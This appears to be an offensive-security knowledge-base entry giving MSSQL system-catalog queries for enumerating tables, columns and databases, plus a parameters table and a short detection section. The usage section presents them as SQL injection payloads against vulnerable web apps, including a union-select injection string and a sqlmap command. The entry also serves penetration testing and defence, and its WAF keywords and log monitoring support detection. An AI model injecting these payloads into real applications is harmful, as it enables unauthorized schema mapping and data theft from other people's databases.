---
id: f80d6a2d-fd73-457c-91cb-96b52f4177ca
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:33.714212+00:00'
updated_at: '2023-04-10T20:22:43.828947+00:00'
tags:
  - MSSQL
  - SQL-Injection
  - Database-Enumeration
platforms:
  - Database
  - Windows
validated: true
---

# MSSQL-Enumerate-Tables-Columns-and-Databases

## Code

```sql
SELECT name FROM master..sysobjects WHERE xtype = 'U'; -- use xtype = 'V' for views
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; -- list column names and types for master..sometable

SELECT table_catalog, table_name FROM information_schema.columns
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
```

## Description

This SQL code snippet contains multiple queries designed to enumerate tables and columns in MSSQL databases, primarily for use in SQL injection scenarios. It targets system views like sysobjects and information_schema to list user tables, specify databases or tables, retrieve column details, query across all databases, and aggregate table names into a delimited string. These queries help attackers map database schemas without direct access, focusing on user objects (xtype='U') while noting variations for views ('V'). The code is compatible with MSSQL 2005+ but the final query requires 2017+ for STRING_AGG.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| someotherdb | Name of the target database to enumerate tables from | northwind |
| sometable | Name of the specific table to list columns for | Users |
| ', ' | Delimiter for concatenated table names (STRING_AGG only) | '; ' |

## Usage

Inject these queries into a confirmed SQL injection point in a web application (e.g., via union select in a search parameter). For example, append `' UNION SELECT name FROM master..sysobjects WHERE xtype='U' --` to a vulnerable input. Use tools like sqlmap for automation (`sqlmap -u URL --dbms=mssql --tables`) or manual injection with Burp Suite. Start with current database queries, then expand to others based on permissions. This code is referenced in the [[procedures/MSSQL-List-Tables]] procedure for step-by-step schema discovery.

## Detection

- Monitor database logs for queries accessing sysobjects, syscolumns, or information_schema.columns from unexpected users or IPs.
- Look for union-based payloads or comments (--) in input logs indicating injection attempts.
- Enable extended events in MSSQL to trace schema enumeration queries.
- WAF rules should flag keywords like 'sysobjects', 'xtype', 'STRING_AGG' in payloads.
- Anomalous result sets returning table/column lists in application responses.
